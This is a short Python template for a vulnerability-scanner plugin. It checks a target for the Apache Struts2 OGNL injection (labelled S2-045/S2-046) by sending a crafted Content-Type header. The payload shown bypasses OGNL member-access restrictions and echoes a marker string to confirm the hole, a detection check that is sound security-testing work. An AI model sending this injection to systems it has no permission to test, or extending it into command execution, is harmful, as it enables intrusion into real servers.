
'''
    there will import python library what you want
'''

import requests

'''
    PoC code ,we do not care PoC's execution ,Report just care test result
    For example ,I try using S2-045 to make templete code
'''

def s2_046(url) :
    output_flag = 'TEST for vuln ..'
    headers = {
        'Content-Type' : '%{(#test="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println("' + output_flag + '")).(#ros.flush())}'
    }
    responed = requests.get(url,headers = headers)
    
    if output_flag in responed.content:
        return True
    
    return False

'''
    PoC scaner dispatch task entry function
    
    valid_vuln(host,port,other = {})
    
    Argument 1 -- host  : target host/ip
    Argument 2 -- port  : target port
    Argument 3 -- other : expand arguments
'''

def valid_vuln(host,port = 80,other = {}) :
    if other.has_key('url') :  #  check custom scan url
        url = other['url']  #  using this url for scan
    else :
        url = 'http://' + host + ':' + str(port) + '/'  #  build scan url
    
    return s2_046(url)  #  try to scan
